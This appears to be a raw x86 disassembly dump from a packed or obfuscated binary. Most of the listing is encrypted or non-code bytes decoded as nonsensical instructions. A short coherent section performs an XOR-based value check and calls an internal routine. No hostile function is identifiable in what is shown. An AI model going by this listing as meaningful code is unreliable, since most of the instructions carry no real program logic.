  40f9d1:	lods   eax,DWORD PTR ds:[esi]
  40f9d2:	cwde   
  40f9d3:	shr    DWORD PTR [esi],1
  40f9d5:	stc    
  40f9d6:	ret    0x6125
  40f9d9:	enter  0xda98,0x68
  40f9dd:	addr16 jno 0x40f979
  40f9e0:	xchg   ebx,eax
  40f9e1:	pop    ebx
  40f9e2:	shl    BYTE PTR ds:0x4a70a04a,0x42
  40f9e9:	mov    ah,bl
  40f9eb:	mov    eax,0xd6df8976
  40f9f0:	int    0x53
  40f9f2:	xlat   BYTE PTR ds:[ebx]
  40f9f3:	jle    0x40f997
  40f9f5:	jg     0x40fa01
  40f9f7:	cmp    al,0x88
  40f9f9:	retf   0xdec8
  40f9fc:	ret    
  40f9fd:	and    eax,0xc19badb
  40fa02:	xchg   ebp,eax
  40fa03:	and    eax,0x5ae4982b
  40fa08:	mov    ecx,ebp
  40fa0a:	adc    BYTE PTR [eax+0x371e981],cl
  40fa10:	loopne 0x40fa12
  40fa12:	inc    eax
  40fa13:	daa    
  40fa14:	mov    dl,0x80
  40fa16:	and    eax,esp
  40fa18:	lds    ebp,FWORD PTR [edx-0x59eb3d9f]
  40fa1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa1f:	cld    
  40fa20:	retf   0x2740
  40fa23:	add    eax,DWORD PTR [ecx+ebp*2-0xf823304]
  40fa2a:	lock test DWORD PTR [ecx+0x7c],ebp
  40fa2e:	aaa    
  40fa2f:	ja     0x40f9ee
  40fa31:	dec    edx
  40fa32:	rol    DWORD PTR [eax],1
  40fa34:	adc    DWORD PTR [esi],esi
  40fa36:	ss sub al,0x96
  40fa39:	sbb    eax,0x5da291f0
  40fa3e:	sub    DWORD PTR [esi-0x2b],0xe481a682
  40fa45:	cdq    
  40fa46:	and    edi,DWORD PTR [edi+0x338bd423]
  40fa4c:	enter  0xe62,0x0
  40fa50:	pop    ecx
  40fa51:	ins    BYTE PTR es:[edi],dx
  40fa52:	or     al,0x15
  40fa54:	sub    al,0xf5
  40fa56:	cld    
  40fa57:	lahf   
  40fa58:	cdq    
  40fa59:	cmp    esp,esi
  40fa5b:	(bad)  
  40fa5d:	add    DWORD PTR [esi-0x7b],0x1
  40fa61:	nop
  40fa62:	mov    ecx,DWORD PTR [edi-0x1658e305]
  40fa68:	cmp    eax,0x840d1a73
  40fa6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa6e:	jb     0x40fac2
  40fa70:	out    0xd8,al
  40fa72:	imul   esp,ebx,0xaf66d6cc
  40fa78:	stc    
  40fa79:	xor    DWORD PTR [edx-0x2],ebp
  40fa7c:	jo     0x40fa4d
  40fa7e:	nop
  40fa7f:	cs jo  0x40fa30
  40fa82:	dec    ecx
  40fa83:	call   0xb441653d
  40fa88:	rol    DWORD PTR [edx+0x311d6fe2],1
  40fa8e:	pushf  
  40fa8f:	mov    bh,0x90
  40fa91:	inc    esi
  40fa92:	fiadd  DWORD PTR [ecx+0x36a71e]
  40fa98:	push   cs
  40fa99:	inc    edx
  40fa9a:	imul   edi,DWORD PTR [ebp+0x4b7628d7],0x72d8bc9b
  40faa4:	jae    0x40facf
  40faa6:	sar    BYTE PTR [edx-0x1b],0xe
  40faaa:	sub    al,0x7f
  40faac:	in     eax,dx
  40faad:	bound  edx,QWORD PTR [edx+0x65a534b6]
  40fab3:	mov    edx,0x4e0c4c70
  40fab8:	arpl   WORD PTR [esi+eiz*1-0x3c],bp
  40fabc:	pop    ebp
  40fabd:	xchg   BYTE PTR [esi],ch
  40fabf:	adc    DWORD PTR [esi],eax
  40fac1:	dec    ebp
  40fac2:	mov    cr7,esi
  40fac5:	clc    
  40fac6:	popa   
  40fac7:	mov    al,ds:0x79b10a50
  40facc:	pop    esp
  40facd:	cmp    edi,DWORD PTR ds:0xd8419c63
  40fad3:	int    0x6e
  40fad5:	leave  
  40fad6:	fidivr WORD PTR [eax-0x1054b616]
  40fadc:	shl    BYTE PTR [eax],1
  40fade:	inc    ecx
  40fadf:	adc    DWORD PTR [ebx+0x16f724c8],ebp
  40fae5:	xor    eax,0x5488dd6
  40faea:	(bad)  
  40faeb:	repz pop ds
  40faed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faee:	fsubr  QWORD PTR [edi+0x5e]
  40faf1:	adc    eax,0x2b8df424
  40faf6:	push   ds
  40faf7:	sbb    bh,BYTE PTR [ecx-0x57e9681a]
  40fafd:	sbb    BYTE PTR [ebp-0x2],dl
  40fb00:	lahf   
  40fb01:	or     DWORD PTR [edi+ecx*1-0x1a47af2f],ebx
  40fb08:	in     al,dx
  40fb09:	dec    esp
  40fb0a:	sbb    al,0xb1
  40fb0c:	aam    0xff
  40fb0e:	ficomp DWORD PTR [ecx+ecx*4]
  40fb11:	hlt    
  40fb12:	push   esp
  40fb13:	cmp    DWORD PTR [ecx-0xc60924d],ebp
  40fb19:	mov    BYTE PTR [edx-0xbf13e5d],dh
  40fb1f:	pusha  
  40fb20:	xor    ebp,DWORD PTR [ecx+0x13]
  40fb23:	jge    0x40fadc
  40fb25:	cwde   
  40fb26:	es sub eax,0x620459b0
  40fb2c:	dec    esi
  40fb2d:	daa    
  40fb2e:	xchg   ecx,eax
  40fb2f:	into   
  40fb30:	push   edi
  40fb31:	xlat   BYTE PTR ds:[ebx]
  40fb32:	xchg   dh,ch
  40fb34:	repnz adc bp,bx
  40fb38:	xchg   BYTE PTR [edx+0x1e],dl
  40fb3b:	push   es
  40fb3c:	or     eax,0xe1aaa959
  40fb41:	cdq    
  40fb42:	fdiv   DWORD PTR [esi]
  40fb44:	inc    esi
  40fb45:	pusha  
  40fb46:	jbe    0x40fb6d
  40fb48:	xchg   BYTE PTR [ebx],dh
  40fb4a:	xor    eax,0xb0b492e7
  40fb4f:	dec    eax
  40fb50:	add    bl,0xda
  40fb53:	xchg   DWORD PTR [ebp-0x6cafb21a],ebp
  40fb59:	leave  
  40fb5a:	cwde   
  40fb5b:	mov    ds:0xaa155b8b,al
  40fb60:	imul   esp,edx,0xffffffbd
  40fb63:	sbb    DWORD PTR [edi+eiz*8-0x14ba7691],esp
  40fb6a:	out    dx,al
  40fb6b:	sub    al,0x47
  40fb6d:	icebp  
  40fb6e:	cmp    al,0xff
  40fb70:	popf   
  40fb71:	mov    dl,0x65
  40fb73:	addr16 neg ecx
  40fb76:	test   edi,esi
  40fb78:	test   al,0xbf
  40fb7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb7b:	icebp  
  40fb7c:	xchg   ebp,eax
  40fb7d:	mov    ah,0x48
  40fb7f:	mov    WORD PTR [edx+0x36],ds
  40fb82:	xchg   BYTE PTR [ecx],dl
  40fb84:	inc    ebx
  40fb85:	cld    
  40fb86:	adc    al,0x6
  40fb88:	int    0x69
  40fb8a:	pop    ebx
  40fb8b:	and    BYTE PTR [edi+0xc91c22d],0x9a
  40fb92:	adc    eax,0xcf614a12
  40fb97:	inc    ebp
  40fb98:	jmp    0x40fb6e
  40fb9a:	mov    ch,0x3f
  40fb9c:	clc    
  40fb9d:	outs   dx,DWORD PTR ds:[esi]
  40fb9e:	rcl    BYTE PTR [esi],cl
  40fba0:	and    dh,BYTE PTR [ebx+0x7b3ada4a]
  40fba6:	cs sbb al,0x61
  40fba9:	jecxz  0x40fb35
  40fbab:	jp     0x40fb5e
  40fbad:	pushf  
  40fbae:	test   ecx,eax
  40fbb0:	xchg   BYTE PTR [edx+eiz*1],bl
  40fbb3:	add    BYTE PTR [esi-0x7b123938],cl
  40fbb9:	dec    edx
  40fbba:	xchg   ecx,eax
  40fbbb:	cwde   
  40fbbc:	and    ch,bl
  40fbbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbbf:	aad    0x48
  40fbc1:	jmp    0x40fbe6
  40fbc3:	add    al,0x82
  40fbc5:	push   esi
  40fbc6:	test   al,0x6e
  40fbc8:	call   ebp
  40fbca:	test   esi,0xaa090571
  40fbd0:	(bad)  
  40fbd1:	imul   ecx,DWORD PTR [esi-0x24],0x718084c1
  40fbd8:	repnz (bad) 
  40fbdb:	je     0x40fc18
  40fbdd:	xchg   ebx,eax
  40fbde:	mov    esi,0xd1fbddb5
  40fbe3:	popf   
  40fbe4:	and    DWORD PTR ds:0x58763bb3,edi
  40fbea:	pop    edx
  40fbeb:	rol    BYTE PTR ds:0x34b91654,0x5b
  40fbf2:	out    dx,eax
  40fbf3:	rol    bh,0x83
  40fbf6:	push   edx
  40fbf7:	and    esi,DWORD PTR [bp+0x4eb3]
  40fbfc:	adc    BYTE PTR [edi],dl
  40fbfe:	ds xor ebx,DWORD PTR cs:[eax-0x11eade18]
  40fc06:	out    dx,eax
  40fc07:	add    eax,0x6768fec5
  40fc0c:	xchg   edx,eax
  40fc0d:	cmp    DWORD PTR [edi+0xc],ecx
  40fc10:	loopne 0x40fc44
  40fc12:	cmp    DWORD PTR [esi+0x2f],esp
  40fc15:	or     dh,ah
  40fc17:	xlat   BYTE PTR ds:[ebx]
  40fc18:	inc    ebx
  40fc19:	jle    0x40fc39
  40fc1b:	js     0x40fc35
  40fc1d:	(bad)  
  40fc1e:	enter  0x9e2e,0x8e
  40fc22:	and    eax,0x997413a3
  40fc27:	leave  
  40fc28:	adc    DWORD PTR ds:0x3c5c2c82,edi
  40fc2e:	(bad)  
  40fc2f:	call   0x832f:0x3e5bdbfa
  40fc36:	fmulp  st(2),st
  40fc38:	mov    esp,0xe7a590d3
  40fc3d:	shl    DWORD PTR [ebx+0x1b6065db],1
  40fc43:	jns    0x40fca7
  40fc45:	xchg   BYTE PTR [edi-0x386b6e50],ch
  40fc4b:	into   
  40fc4c:	addr16 jmp 0xb9f:0xd6eafabf
  40fc54:	enter  0xd573,0x7a
  40fc58:	retf   
  40fc59:	add    ch,BYTE PTR [eax-0x63]
  40fc5c:	xchg   edi,eax
  40fc5d:	mov    ecx,0xf0846dd9
  40fc62:	mov    ecx,0x7f814530
  40fc67:	mov    ss,WORD PTR [edi]
  40fc69:	xchg   esi,eax
  40fc6a:	mov    eax,ds:0x6ebc3aa4
  40fc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc70:	jnp    0x40fca8
  40fc72:	loope  0x40fc30
  40fc74:	adc    eax,0x743b2bf3
  40fc79:	adc    DWORD PTR ds:0x5f63d776,ecx
  40fc7f:	popa   
  40fc80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc81:	mov    ds:0xc65b10d1,eax
  40fc86:	xor    bh,BYTE PTR [ebp-0x6fe186d]
  40fc8c:	inc    esi
  40fc8d:	pop    es
  40fc8e:	xor    eax,0x98e369fe
  40fc93:	sub    esp,DWORD PTR [edi-0x3]
  40fc96:	outs   dx,BYTE PTR ds:[esi]
  40fc97:	push   edi
  40fc98:	fidiv  DWORD PTR [edi+0x11cdeb19]
  40fc9e:	fist   DWORD PTR [edi-0x69]
  40fca1:	mov    ds:0x55b7a456,eax
  40fca6:	mov    edi,0xaf5e97
  40fcab:	ja     0x40fd18
  40fcad:	imul   esp,DWORD PTR [edx-0x56576bee],0xa07bb03b
  40fcb7:	xchg   ebx,eax
  40fcb8:	add    DWORD PTR [edi-0x47],0x5c2f5878
  40fcbf:	xlat   BYTE PTR ds:[ebx]
  40fcc0:	in     eax,0x4f
  40fcc2:	push   ebx
  40fcc3:	lds    esp,FWORD PTR [esi+0x1b]
  40fcc6:	push   0xbbedf04f
  40fccb:	test   edi,ebp
  40fccd:	mov    edi,0x3e7f3820
  40fcd2:	imul   esp,DWORD PTR [ecx],0x11864e34
  40fcd8:	loop   0x40fcdb
  40fcda:	inc    ebp
  40fcdb:	ret    
  40fcdc:	lea    ecx,[ebx+0x11aba449]
  40fce2:	repz push ebp
  40fce4:	aas    
  40fce5:	jg     0x40fd1b
  40fce7:	mov    eax,0xda324a1c
  40fcec:	iret   
  40fced:	ins    BYTE PTR es:[edi],dx
  40fcee:	push   ecx
  40fcef:	mov    DWORD PTR [esi],ebx
  40fcf1:	inc    ebp
  40fcf2:	ins    BYTE PTR es:[edi],dx
  40fcf3:	dec    esi
  40fcf4:	and    dh,BYTE PTR [ebp+0x29]
  40fcf7:	xchg   bl,dl
  40fcf9:	pop    eax
  40fcfa:	mov    ch,0x83
  40fcfc:	jo     0x40fd52
  40fcfe:	cmp    ch,BYTE PTR [ebx]
  40fd00:	aam    0xb7
  40fd02:	add    eax,0xe38bd63b
  40fd07:	pop    ebp
  40fd08:	mov    bh,BYTE PTR [edi-0x4e]
  40fd0b:	push   0x231e2d8d
  40fd10:	mov    ss,WORD PTR [eax]
  40fd12:	dec    esi
  40fd13:	pop    eax
  40fd14:	xchg   ebx,eax
  40fd16:	and    ebp,DWORD PTR [eax-0x2f]
  40fd19:	stos   BYTE PTR es:[edi],al
  40fd1a:	mov    ?,WORD PTR [esi]
  40fd1c:	sar    cl,cl
  40fd1e:	out    0xb1,al
  40fd20:	sub    ebx,DWORD PTR [ecx+0x6a]
  40fd23:	inc    eax
  40fd24:	stos   DWORD PTR es:[edi],eax
  40fd25:	push   edx
  40fd26:	nop
  40fd27:	fstp   QWORD PTR [edi]
  40fd29:	lds    ecx,FWORD PTR [edx-0x60]
  40fd2c:	out    dx,al
  40fd2d:	push   0x5f20f78b
  40fd32:	adc    bh,BYTE PTR [edx]
  40fd34:	push   ecx
  40fd35:	jnp    0x40fccf
  40fd37:	xchg   edi,eax
  40fd38:	mov    dh,0xfa
  40fd3a:	arpl   ax,bp
  40fd3c:	dec    edx
  40fd3d:	or     al,0x0
  40fd3f:	add    BYTE PTR [ebx+0x414afe0d],cl
  40fd45:	add    BYTE PTR [ebx+0x1cc89],cl
  40fd4b:	add    BYTE PTR [ecx-0x7ba74ff],cl
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	jo     0x40fd2b
  40fd9e:	mov    ebx,DWORD PTR [eax-0x7e]
  40fda1:	mov    eax,0x79f47e7e
  40fda6:	jle    0x40fe26
  40fda8:	lahf   
  40fda9:	fdivp  st(6),st
  40fdab:	dec    edx
  40fdac:	(bad)  
  40fdad:	(bad)  
  40fdae:	sbb    eax,0x961f0a2e
  40fdb3:	add    eax,0xe138b246
  40fdb8:	jae    0x40fe22
  40fdba:	or     bh,bh
  40fdbc:	cmp    ebx,DWORD PTR ss:[eax]
  40fdbf:	xor    al,0x76
  40fdc1:	mov    ds:0x50e1d23c,eax
  40fdc6:	bnd je 0x40fdab
  40fdc9:	jmp    DWORD PTR [ebx-0x6]
  40fdcc:	mov    esp,?
  40fdce:	push   ebp
  40fdcf:	mov    ds:0x396931aa,eax
  40fdd4:	jmp    0x40fdc3
  40fdd6:	fisubr DWORD PTR [ebp-0x6a927964]
  40fddc:	jne    0x40fd8b
  40fdde:	push   esp
  40fddf:	loope  0x40fe49
  40fde1:	mov    ecx,0xbd1d66b7
  40fde6:	jmp    0xae442f6b
  40fdeb:	and    DWORD PTR [edi],ecx
  40fded:	out    dx,eax
  40fdee:	mov    cl,0x2c
  40fdf0:	ss add al,0x3
  40fdf3:	inc    DWORD PTR [edi]
  40fdf5:	ret    0x4ff7
  40fdf8:	pop    eax
  40fdf9:	and    ch,ch
  40fdfb:	clc    
  40fdfc:	lods   eax,DWORD PTR ds:[esi]
  40fdfd:	scas   eax,DWORD PTR es:[edi]
  40fdfe:	ins    DWORD PTR es:[edi],dx
  40fdff:	(bad)  [esi-0x2b45bbe8]
  40fe05:	(bad)  
  40fe07:	sub    ah,BYTE PTR [esi-0x17885f0c]
  40fe0d:	aad    0x76
  40fe0f:	cmp    ecx,DWORD PTR [esi-0x4c9f67b5]
  40fe15:	popa   
  40fe16:	dec    ebx
  40fe17:	adc    al,0x53
  40fe19:	sbb    ah,cl
  40fe1b:	shl    BYTE PTR [esi],0xd4
  40fe1e:	xchg   ecx,eax
  40fe1f:	mov    al,0xba
  40fe21:	repnz inc ebp
  40fe23:	cs push cs
  40fe25:	loope  0x40fe00
  40fe27:	pop    ss
  40fe28:	cli    
  40fe29:	clc    
  40fe2a:	jmp    0xf3d6:0xa29c8c50
  40fe31:	mov    eax,0xc3887340
  40fe36:	sub    al,ah
  40fe38:	ss je  0x40fddf
  40fe3b:	jnp    0x40febb
  40fe3d:	hlt    
  40fe3e:	sar    BYTE PTR [ebp+0x5ded7261],0x4a
  40fe45:	sbb    BYTE PTR [edx+0x50],bh
  40fe48:	in     al,dx
  40fe49:	test   eax,0xd673b737
  40fe4e:	sub    dl,BYTE PTR [ebx-0x1113dcbb]
  40fe54:	push   ss
  40fe55:	or     ch,BYTE PTR [eax]
  40fe57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe58:	push   cs
  40fe59:	xor    DWORD PTR [esi-0x68132d08],edx
  40fe5f:	sub    BYTE PTR [edx-0x1882980f],dl
  40fe65:	add    eax,0x7c01ff7c
  40fe6a:	and    eax,0xd3d343b7
  40fe6f:	inc    ebx
  40fe70:	lahf   
  40fe71:	pop    esp
  40fe72:	mov    edx,0xc6d6ca7e
  40fe77:	out    0x8f,eax
  40fe79:	cld    
  40fe7a:	stc    
  40fe7b:	jmp    0x95333f4f
  40fe80:	mov    ch,0x9e
  40fe82:	pop    ebx
  40fe83:	inc    BYTE PTR [edi+0x2e]
  40fe86:	adc    ebx,DWORD PTR [ebx+0x4f2c411a]
  40fe8c:	jg     0x40fe3a
  40fe8e:	cmp    DWORD PTR [eax+0x286490d8],edx
  40fe94:	pop    esp
  40fe95:	dec    ebp
  40fe96:	push   esi
  40fe97:	and    al,BYTE PTR [ecx]
  40fe99:	out    dx,al
  40fe9a:	mov    eax,0xdc320d4a
  40fe9f:	push   ebp
  40fea0:	pushf  
  40fea1:	mov    ebp,0x8e228149
  40fea6:	das    
  40fea7:	mov    esi,0x67d99e26
  40feac:	mov    al,0xf3
  40feae:	mov    eax,0xc59d9b3b
  40feb3:	div    ah
  40feb5:	jmp    0xe740bf88
  40feba:	(bad)  
  40febb:	xlat   BYTE PTR ds:[ebx]
  40febc:	push   esp
  40febd:	xchg   edi,eax
  40febe:	out    dx,eax
  40febf:	add    esp,ecx
  40fec1:	aad    0x23
  40fec3:	add    eax,ecx
  40fec5:	jmp    0x77f:0xe9286ea9
  40fecc:	sbb    eax,0x6ca2405
  40fed1:	adc    ecx,DWORD PTR [edx-0x8]
  40fed4:	pop    ss
  40fed5:	jmp    0x9cb8a457
  40feda:	(bad)  
  40fedb:	pushf  
  40fedc:	or     BYTE PTR [edi-0x37c14933],0x4a
  40fee3:	ins    DWORD PTR es:[edi],dx
  40fee4:	jmp    DWORD PTR [edx-0x20b2df27]
  40feea:	ffreep st(5)
  40feec:	dec    edi
  40feed:	fcmovbe st,st(7)
  40feef:	mov    DWORD PTR [eax],ebp
  40fef1:	shr    BYTE PTR [ecx+0x4bcedfb0],0x95
  40fef8:	add    ch,BYTE PTR [eax+0x69]
  40fefb:	in     eax,0x89
  40fefd:	cmp    DWORD PTR [eax],edx
  40feff:	mov    esi,DWORD PTR ss:[ebx]
  40ff02:	and    ah,BYTE PTR [esi]
  40ff04:	jb     0x40ff7d
  40ff06:	ss (bad) 
  40ff08:	xchg   ebx,eax
  40ff09:	inc    ebx
  40ff0a:	fsubp  st(4),st
  40ff0c:	mov    eax,0xdae63fa8
  40ff11:	mov    dh,0xcd
  40ff13:	dec    esi
  40ff14:	ins    DWORD PTR es:[edi],dx
  40ff15:	imul   edx,DWORD PTR [ebx+0x37],0xebf6b1a0
  40ff1c:	out    0xcb,al
  40ff1e:	lahf   
  40ff1f:	inc    esi
  40ff20:	or     al,0xc4
  40ff22:	adc    dl,ah
  40ff24:	push   ebp
  40ff25:	and    al,0xf3
  40ff27:	pushf  
  40ff28:	pop    ss
  40ff29:	add    ah,dl
  40ff2b:	mov    ch,0x18
  40ff2d:	loop   0x40fec8
  40ff2f:	jp     0x40fec2
  40ff31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff32:	ds push cs
  40ff34:	mov    esi,DWORD PTR [ecx-0x19b8ea8e]
  40ff3a:	repz int3 
  40ff3c:	sbb    BYTE PTR [ebx-0x244c9148],ch
  40ff42:	inc    esi
  40ff43:	int    0x83
  40ff45:	sub    DWORD PTR [ebp+0x63f30637],eax
  40ff4b:	cwde   
  40ff4c:	mov    ecx,0xa279e215
  40ff51:	sub    eax,0x81a1b655
  40ff56:	ins    DWORD PTR es:[edi],dx
  40ff57:	(bad)  [edi]
  40ff59:	fstp   TBYTE PTR ds:0xc84c01f1
  40ff5f:	pop    ebp
  40ff60:	adc    al,al
  40ff62:	mov    edx,0x7db19d46
  40ff67:	mov    BYTE PTR [edi+0x1bc31c8],dl
  40ff6d:	dec    edi
  40ff6e:	fs ret 0x19bc
  40ff72:	popa   
  40ff73:	daa    
  40ff74:	xchg   esi,eax
  40ff75:	push   ds
  40ff76:	imul   ebx,DWORD PTR [esi-0x746c4d0e],0xffffffbb
  40ff7d:	cmp    eax,0x46
  40ff80:	xchg   esp,eax
  40ff81:	dec    eax
  40ff82:	test   bl,ah
  40ff84:	lods   eax,DWORD PTR ds:[esi]
  40ff85:	add    edx,DWORD PTR [eax-0x7e]
  40ff88:	sub    DWORD PTR [eax*1+0x7a35e9af],edi
  40ff8f:	bound  ecx,QWORD PTR [ecx-0x7]
  40ff92:	(bad)  
  40ff93:	(bad)  
  40ff94:	(bad)  
  40ff95:	daa    
  40ff96:	js     0x40ff8e
  40ff98:	push   edi
  40ff99:	ret    
  40ff9a:	pop    eax
  40ff9b:	adc    eax,0x7925d496
  40ffa0:	ffree  st(2)
  40ffa2:	cmp    ah,ch
  40ffa4:	and    al,0x3b
  40ffa6:	cmp    al,BYTE PTR ds:0x7796
  40ffab:	xor    ecx,ecx
  40ffad:	nop
  40ffae:	and    DWORD PTR [eax-0x7133cd87],0x26eafcf6
  40ffb8:	xchg   edi,eax
  40ffb9:	test   BYTE PTR [ecx+0x75680de8],ah
  40ffbf:	lock mov bh,0xd4
  40ffc2:	mov    ds:0x38c8fff3,al
  40ffc7:	add    eax,edi
  40ffc9:	les    edx,FWORD PTR [edx-0x17769e00]
  40ffcf:	fwait
  40ffd0:	sbb    cl,BYTE PTR [ebp+0x52f08e38]
  40ffd6:	mov    WORD PTR [edx],?
  40ffd8:	jbe    0x40ff91
  40ffda:	jbe    0x40ffcd
  40ffdc:	das    
  40ffdd:	xchg   edx,eax
  40ffde:	add    BYTE PTR [esp+eax*1+0x7e],0x1
  40ffe3:	stc    
  40ffe4:	or     dh,ch
  40ffe6:	sti    
  40ffe7:	ins    BYTE PTR es:[edi],dx
  40ffe8:	push   ebx
  40ffe9:	cwde   
  40ffea:	sub    al,0xe5
  40ffec:	xchg   ecx,eax
  40ffed:	sub    ecx,eax
  40ffef:	rcl    ebx,cl
  40fff1:	aas    
  40fff2:	ins    DWORD PTR es:[edi],dx
  40fff3:	out    0x6,eax
  40fff5:	push   eax
  40fff6:	jae    0x410034
  40fff8:	mov    eax,0xa01fc162
  40fffd:	sbb    al,0xc7
  40ffff:	sub    dh,BYTE PTR [edi]
  410001:	inc    esp
  410002:	fdiv   DWORD PTR ds:[ecx]
  410005:	pop    ds
  410006:	fimul  DWORD PTR [esi+eiz*4+0x5b]
  41000a:	cmp    BYTE PTR [ecx],bl
  41000c:	test   esi,0x7794e4be
  410012:	add    al,BYTE PTR [ecx-0x11]
  410015:	mov    ah,0x49
  410017:	dec    esi
  410018:	or     dl,BYTE PTR [ebp+0x3ffcfa40]
  41001e:	in     al,0x15
  410020:	aam    0xb2
  410022:	neg    BYTE PTR [ecx]
  410024:	and    al,0xba
  410026:	and    DWORD PTR [edx-0x69],esi
  410029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002a:	and    DWORD PTR [eax+edx*4],0x27
  41002e:	adc    al,0x7
  410030:	cmp    cl,BYTE PTR [ebx+0x17]
  410033:	shr    DWORD PTR [ecx+ecx*2-0x59],cl
  410037:	out    0x6,eax
  410039:	scas   al,BYTE PTR es:[edi]
  41003a:	push   ds
  41003b:	shr    edx,1
  41003d:	(bad)  
  41003e:	mov    ah,0x8b
  410040:	fdiv   QWORD PTR [esi]
  410042:	inc    eax
  410043:	mov    eax,ds:0x6cdf0bb2
  410048:	inc    eax
  410049:	divps  xmm1,XMMWORD PTR [edx]
  41004c:	js     0x410018
  41004e:	popf   
  41004f:	xor    al,0xfd
  410051:	mov    WORD PTR [ecx-0x6900c973],?
  410057:	fwait
  410058:	cmp    BYTE PTR ds:[ebx],cl
  41005b:	ss out dx,al
  41005d:	sub    DWORD PTR [edx],esi
  41005f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410060:	cli    
  410061:	xchg   esp,eax
  410062:	fistp  QWORD PTR [esp+eiz*2+0x2b]
  410066:	push   ebp
  410067:	xchg   edx,eax
  410068:	mov    bl,BYTE PTR [edi-0x51ac129d]
  41006e:	lahf   
  41006f:	push   ebx
  410070:	daa    
  410071:	mov    esi,0xb65eb414
  410076:	gs call 0xe54c:0xbb1d149e
  41007e:	jmp    0xd25a46cb
  410083:	mov    al,ds:0x1879b6b8
  410088:	out    dx,al
  410089:	(bad)  
  41008a:	push   esi
  41008b:	sti    
  41008c:	inc    ebx
  41008d:	adc    eax,0x9019331d
  410092:	hlt    
  410093:	sub    al,0x59
  410095:	pushf  
  410096:	xor    ah,bl
  410098:	stc    
  410099:	(bad)  
  41009a:	retf   
  41009b:	fisub  DWORD PTR [eax]
  41009d:	popa   
  41009e:	dec    edi
  41009f:	sub    al,0x14
  4100a1:	imul   ebp,edx,0x616fcf55
  4100a7:	push   esp
  4100a8:	inc    edx
  4100a9:	out    dx,al
  4100aa:	out    dx,al
  4100ab:	push   ecx
  4100ac:	cmp    DWORD PTR [edi],edx
  4100ae:	sbb    al,0x83
  4100b0:	and    DWORD PTR [ebx-0x4e3bbdfc],esi
  4100b6:	inc    edi
  4100b7:	xchg   edx,eax
  4100b8:	xchg   ebx,eax
  4100b9:	xchg   ebp,eax
  4100ba:	inc    esi
  4100bb:	push   ebx
  4100bc:	(bad)  
  4100bd:	push   eax
  4100be:	pop    ecx
  4100bf:	jle    0x4100a6
  4100c1:	retf   
  4100c2:	in     eax,0xe5
  4100c4:	int3   
  4100c5:	les    esi,FWORD PTR [esi-0x26]
  4100c8:	jb     0x410108
  4100ca:	pushf  
  4100cb:	ret    
  4100cc:	adc    BYTE PTR ds:0x3ebe584a,dl
  4100d2:	ret    0x7462
  4100d5:	jmp    0x31ed6ba4
  4100da:	adc    bp,sp
  4100dd:	ret    0xa621
  4100e0:	(bad)  
  4100e1:	retf   
  4100e2:	lahf   
  4100e3:	push   esp
  4100e4:	repnz mov ebx,0x46683211
  4100ea:	inc    esi
  4100eb:	push   esp
  4100ec:	adc    DWORD PTR [ebx+0x7d],0x7d
  4100f0:	mov    dl,0x77
  4100f2:	mov    cl,0xa3
  4100f4:	inc    ecx
  4100f5:	xor    BYTE PTR [edx+0x76a475a0],ch
  4100fb:	int    0x4f
  4100fd:	push   ecx
  4100fe:	jg     0x41010d
  410100:	push   esi
  410101:	inc    esp
  410102:	mov    WORD PTR [esi],cs
  410104:	loope  0x410094
  410106:	adc    ebp,DWORD PTR [ebp+0xf]
  410109:	dec    eax
  41010a:	cmp    bl,BYTE PTR [ebx-0x48c8f5b1]
  410110:	aam    0x20
  410112:	sub    al,0x98
  410114:	je     0x41011d
  410116:	bnd jbe 0x4100c9
  410119:	and    eax,0xb010ad94
  41011e:	mov    eax,DWORD PTR [ebp-0x4]
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    DWORD PTR [esi+0x2a],esi
  410137:	push   ss
  410138:	xchg   ebx,eax
  410139:	js     0x41017f
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x41016a
  410142:	pop    edi
  410143:	fs pushf 
  410145:	adc    eax,DWORD PTR [ecx]
  410147:	mov    ah,0x40
  410149:	sub    BYTE PTR [esi],bh
  41014b:	and    dl,dl
  41014d:	in     eax,dx
  41014e:	call   0xf4cd:0xe52a498
  410155:	xor    BYTE PTR [ebx+0x9],al
  410158:	pop    ebp
  410159:	jo     0x410141
  41015b:	or     ch,bh
  41015d:	jmp    0x56d4875a
  410162:	sbb    BYTE PTR [ecx-0x39],ah
  410165:	xor    dl,cl
  410167:	loopne 0x4101df
  410169:	dec    esp
  41016a:	or     al,0x3d
  41016c:	fidiv  WORD PTR [eax+0x39520958]
  410172:	adc    BYTE PTR [edi-0x6be8d977],dl
  410178:	cld    
  410179:	xchg   esi,eax
  41017a:	and    al,0x88
